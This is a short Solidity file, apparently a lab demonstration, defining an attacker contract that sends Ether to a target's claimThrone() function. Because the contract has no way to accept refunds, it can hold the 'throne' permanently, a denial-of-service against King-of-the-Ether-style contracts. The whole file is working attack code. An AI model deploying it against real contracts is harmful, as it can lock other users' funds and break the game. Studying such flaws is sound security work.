// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableContract.sol";

contract MaliciousContract {
    address payable public targetSc;

    constructor(address _targetSc) {
        targetSc = payable(_targetSc);
    }

    function attack() public payable {
        targetSc.call{value: msg.value}(
            abi.encodeWithSignature("claimThrone()")
        );
    }
}
